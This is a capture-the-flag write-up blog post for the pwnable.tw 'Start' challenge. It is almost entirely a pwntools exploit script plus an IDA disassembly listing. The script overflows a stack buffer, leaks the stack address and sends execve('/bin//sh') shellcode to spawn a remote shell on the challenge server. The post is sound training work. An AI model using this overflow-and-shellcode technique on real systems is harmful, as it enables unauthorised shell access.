---
layout: post
title: 'Pwnable.tw: Start'
published: true
---
First, we check file info: 

![Capture.PNG]({{site.baseurl}}/img/ctf/pwnable.tw/Capture.PNG)


It's a .elf file. Now we should open disassembler like IDA Pro.
![assembly.PNG]({{site.baseurl}}/img/ctf/pwnable.tw/assembly.PNG)

{% highlight python linenos %}
from pwn import *

  conn = remote("chall.pwnable.tw", 10000)
  conn.recv(20)

  shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

  payload = 'A'* 20 + p32(0x08048087)
  conn.send(payload)
  esp_add = conn.recv(20)

  print esp_add

  esp_add = u32(esp_add[0:4])
  print esp_add
  payload = 'A' * 20 + p32(esp_add + 20) + shellcode
  conn.send(payload)


  conn.interactive()
  conn.close()
{% endhighlight %}


{% highlight intel-assembly linenos %}
.text:08048060 push    esp
.text:08048061 push    offset _exit
.text:08048066 xor     eax, eax                        ; Logical Exclusive OR
.text:08048068 xor     ebx, ebx                        ; Logical Exclusive OR
.text:0804806A xor     ecx, ecx                        ; Logical Exclusive OR
.text:0804806C xor     edx, edx                        ; Logical Exclusive OR
.text:0804806E push    3A465443h
.text:08048073 push    20656874h
.text:08048078 push    20747261h
.text:0804807D push    74732073h
.text:08048082 push    2774654Ch
.text:08048087 mov     ecx, esp                        ; addr
.text:08048089 mov     dl, 14h                         ; len
.text:0804808B mov     bl, 1                           ; fd
.text:0804808D mov     al, 4
.text:0804808F int     80h                             ; LINUX - sys_write
.text:08048091 xor     ebx, ebx                        ; Logical Exclusive OR
.text:08048093 mov     dl, 3Ch
.text:08048095 mov     al, 3
.text:08048097 int     80h                             ; LINUX -

{% endhighlight %}







